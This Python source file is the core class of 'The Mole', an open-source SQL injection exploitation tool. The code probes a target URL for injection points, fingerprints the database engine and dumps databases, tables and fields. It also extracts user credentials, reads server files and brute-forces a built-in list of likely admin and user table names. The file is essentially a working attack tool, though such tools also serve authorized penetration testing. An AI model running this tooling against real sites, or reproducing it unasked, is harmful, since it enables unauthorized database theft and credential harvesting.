#!/usr/bin/python3
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
#
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from moleexceptions import MoleAttributeRequired, PageNotFound, ConnectionException
from moleexceptions import DbmsDetectionFailed, CommentNotFound, ColumnNumberNotFound
from moleexceptions import InjectableFieldNotFound, InvalidParamException
from moleexceptions import NotInitializedException, QueryError
from domanalyser import DomAnalyser
from dbmsmoles import MysqlMole, PostgresMole, SQLServerMole, OracleMole
from dbdump import DatabaseDump
from threader import Threader
from xmlexporter import XMLExporter
from injectioninspector import InjectionInspector
from datadumper import BlindDataDumper, StringUnionDataDumper, IntegerUnionDataDumper
from connection.requester import Requester
from connection.requestsender import HttpRequestSender, HttpHeadRequestSender

class TheMole:

    ex_string = 'Operation not supported for this dumper'
    field = '[_SQL_Field_]'
    table = '[_SQL_Table_]'
    wildcard = '[_SQL_]'

    users_tables = [
        'adm',
        'admin',
        'admin_users',
        'admins',
        'administrator',
        'administrador',
        'administradores',
        'client',
        'clients',
        'jos_users',
        'login',
        'logins',
        'user',
        'user_admin',
        'users',
        'usuario',
        'usuarios',
        'usuarios_admin',
        'usr',
        'usrs',
        'wp_users',
    ]

    dbms_mole_list = [MysqlMole, SQLServerMole, PostgresMole, OracleMole]
    sender_list = [HttpRequestSender, HttpHeadRequestSender]

    def __init__(self, threads=4):
        self.initialized = False
        self.needle = None
        self.url = None
        self.mode = 'union'
        self.threader = Threader(threads)
        self.prefix = ''
        self.suffix = ''
        self.end = ''
        self.verbose = False
        self.delay = 0
        self.separator = ''
        self.comment = ''
        self.parenthesis = 0
        self._dbms_mole = None
        self.stop_query = False
        self.query_columns = 0
        self.injectable_field = 0
        self.database_dump = DatabaseDump()
        self.requester = Requester(HttpRequestSender())

    def restart(self):
        self.initialized = False

    def initialize(self):
        self.analyser = DomAnalyser()
        if not self.requester.is_initialized():
            raise MoleAttributeRequired('Attribute url and vulnerable param are required')
        if not self.needle:
            raise MoleAttributeRequired('Attribute needle is required')

        self.query_columns = 0
        self.injectable_field = 0
        self.separator = ''
        self.comment = ''
        self.end = ''
        self.parenthesis = 0
        self._dbms_mole = None
        self.database_dump = DatabaseDump()

        injection_inspector = InjectionInspector()

        try:
            original_request = self.requester.request(self.prefix + self.suffix)
        except ConnectionException as ex:
            raise PageNotFound(str(ex))
        self.analyser.set_good_page(original_request, self.needle)

        self.end = self.suffix
        self.separator, self.parenthesis = injection_inspector.find_separator(self)
        output_manager.advance('Found separator: "{0}"'.format(self.separator)).line_break()

        blind_parenthesis = self.parenthesis
        if not self.separator == ' ' and self.suffix == '':
            self.end = 'and {op_par}' + '{sep}1{sep} like {sep}1'.format(sep=self.separator, par=(self.parenthesis * ')'))
        else:
            self.end = self.suffix

        if self.mode == 'union':
            try:
                self._detect_dbms_blind()
            except DbmsDetectionFailed:
                output_manager.info('Early DBMS detection failed. Retrying later.').line_break()

            self.end = self.suffix
            req = self.make_request(' own3d by 1')
            self._syntax_error_content = self.analyser.node_content(req)

            try:
                self.comment, self.parenthesis = injection_inspector.find_comment_delimiter(self)
                output_manager.advance('Found comment delimiter: "{0}"'.format(self.comment)).line_break()
            except CommentNotFound:
                if self._dbms_mole:
                    output_manager.error('Could not find comment.').line_break()
                    output_manager.info('Using blind mode.').line_break()
                    self._go_blind(blind_parenthesis)
                    self.initialized = True
                    return
                raise

            try:
                self.query_columns = injection_inspector.find_column_number(self)
                output_manager.advance('Query columns count: {0}'.format(self.query_columns)).line_break()
            except ColumnNumberNotFound as ex:
                if self._dbms_mole:
                    output_manager.error('Could not find number of columns. ({0})'.format(str(ex))).line_break()
                    output_manager.advance('Using blind mode.').line_break()
                    self._go_blind(blind_parenthesis)
                    self.initialized = True
                    return
                raise

            try:
                self.injectable_field = injection_inspector.find_injectable_field(self)
                output_manager.advance('Found injectable field: {0}'.format(self.injectable_field + 1)).line_break()

            except InjectableFieldNotFound as ex:
                if self._dbms_mole:
                    output_manager.error('Could not find injectable field.').line_break()
                    output_manager.info('Using blind mode.').line_break()
                    self._go_blind(blind_parenthesis)
                    self.initialized = True
                    return
                raise

            if self._dbms_mole is None:
                raise DbmsDetectionFailed()

            if self._dbms_mole.is_string_query():
                output_manager.advance('Using string union technique.').line_break()
                self.dumper = StringUnionDataDumper()
            else:
                output_manager.advance('Using integer union technique.').line_break()
                self.dumper = IntegerUnionDataDumper()
        else:
            self._detect_dbms_blind()
            self.dumper = BlindDataDumper()

        self.initialized = True

    def _go_blind(self, parenthesis):
        if not self.separator == ' ':
            self.end = 'and {op_par}' + '{sep}1{sep} like {sep}1'.format(sep=self.separator, par=(self.parenthesis * ')'))
        else:
            self.end = ' '
        self.end += self.suffix
        self.comment = ''
        self.parenthesis = parenthesis
        self.dumper = BlindDataDumper()

    def set_injectable_field(self, field):
        if field < 0 or field >= self.query_columns:
            return False
        output_manager.info('Trying injection on field {0}'.format(field + 1)).line_break()
        output_manager.echo_output = False
        try:
            if len(self.dumper.get_databases(self, field, 1)) > 0:
                return True
        except QueryError:
            return False
        finally:
            output_manager.echo_output = True
        output_manager.line_break()
        return False

    def generate_url(self, injection_string):
        url = ('{prefix}{sep}{par}' + injection_string + '{end}{com}').format(
                                        sep=self.separator,
                                        com=self.comment,
                                        par=(self.parenthesis * ')'),
                                        op_par=(self.parenthesis * '('),
                                        prefix=self.prefix,
                                        end=self.end.format(op_par=(self.parenthesis * '('))
            )
        if self.verbose == True:
            output_manager.line_break().info('Executing query: {0}'.format(url)).line_break()
        return url

    def make_request(self, query):
        req = self.requester.request(self.generate_url(query))
        if not '<html' in req and not '<HTML' in req:
            req = '<html><body>' + req + '</body></html>'
        return req

    def set_mode(self, mode):
        self.mode = mode
        self.initialized = False

    def poll_databases(self):
        if self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        else:
            return None

    def abort_query(self):
        self.stop_query = True

    def get_databases(self, force_fetch=False):
        if not force_fetch and self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        data = self.dumper.get_databases(self, self.injectable_field)
        for i in data:
            self.database_dump.add_db(i)
        return data

    def poll_tables(self, db):
        try:
            if self.database_dump.db_map[db]:
                return list(self.database_dump.db_map[db].keys())
        except KeyError:
            pass
        return None

    def get_tables(self, db, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and self.database_dump.db_map[db]:
            return list(self.database_dump.db_map[db].keys())

        data = self.dumper.get_tables(self, db, self.injectable_field)
        for i in data:
            self.database_dump.add_table(db, i)
        return data

    def poll_columns(self, db, table):
        try:
            if self.database_dump.db_map[db][table]:
                return list(self.database_dump.db_map[db][table])
        except KeyError:
            pass
        return None

    def get_columns(self, db, table, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and table in self.database_dump.db_map[db] and len(self.database_dump.db_map[db][table]) > 0:
            return list(self.database_dump.db_map[db][table])

        data = self.dumper.get_columns(self, db, table, self.injectable_field)
        for i in data:
            self.database_dump.add_column(db, table, i)
        return data

    def get_fields(self, db, table, fields, where="1=1", start=0, limit=0x7fffffff):
        limit = max(limit, 0)
        return self.dumper.get_fields(self, db, table, fields, where, self.injectable_field, start=start, limit=limit)

    def get_user_creds(self):
        return self.dumper.get_user_creds(self, self.injectable_field)

    def get_dbinfo(self):
        return self.dumper.get_dbinfo(self, self.injectable_field)

    def find_tables_like(self, db, table_filter):
        data = self.dumper.find_tables_like(self, db, table_filter, self.injectable_field)
        for i in data:
            self.database_dump.add_table(db, i)
        return data

    def read_file(self, filename):
        return self.dumper.read_file(self, filename, self.injectable_field)

    def brute_force_tables(self, db, table_list):
        for table in table_list:
            output_manager.info('Trying table: {0}'.format(table))
            try:
                if self.dumper.table_exists(self, db, table, self.injectable_field):
                    self.database_dump.add_table(db, table)
                    output_manager.advance('Table {0} exists.'.format(table)).line_break()
            except:
                pass
        output_manager.line_break()

    def brute_force_users_tables(self, db):
        return self.brute_force_tables(db, TheMole.users_tables)

    def set_url(self, url, vulnerable_param=None):
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        self.requester.url = url
        if vulnerable_param is None and '?' in url:
            params = list(t.split('=', 1) for t in url.split('?')[1].split('&'))
            vulnerable_param = params[-1][0]
        try:
            self.requester.set_vulnerable_param('GET', vulnerable_param)
        except InvalidParamException as ex:
            output_manager.error('Invalid parameter({msg}).'.format(msg=str(ex))).line_break()
        self.initialized = False

    def get_url(self):
        try:
            return self.requester.url
        except AttributeError:
            return ''

    def set_method(self, method):
        self.requester.method = method
        self.initialized = False

    def set_post_params(self, params):
        self.requester.post_parameters = params
        self.initialized = False

    def set_cookie_params(self, params):
        self.requester.cookie_parameters = params
        self.initialized = False

    def set_vulnerable_param(self, method, param):
        self.requester.set_vulnerable_param(method, param)
        self.initialized = False

    def export_xml(self, filename):
        if not self.initialized:
            raise NotInitializedException()
        exporter = XMLExporter()
        exporter.export(self, self.database_dump.db_map, filename)

    def import_xml(self, filename):
        exporter = XMLExporter()
        exporter.load(self, self.database_dump.db_map, filename)
        self.initialized = True

    def _detect_dbms_blind(self):
        for dbms_mole_class in TheMole.dbms_mole_list:
            output_manager.info('Trying DBMS {0}'.format(dbms_mole_class.dbms_name()))
            query = dbms_mole_class.dbms_check_blind_query()
            try:
                req = self.make_request(query)
            except ConnectionException as ex:
                raise DbmsDetectionFailed(str(ex))
            if self.analyser.is_valid(req):
                self._dbms_mole = dbms_mole_class()
                output_manager.advance('Found DBMS: {0}'.format(dbms_mole_class.dbms_name())).line_break()
                return
        raise DbmsDetectionFailed()


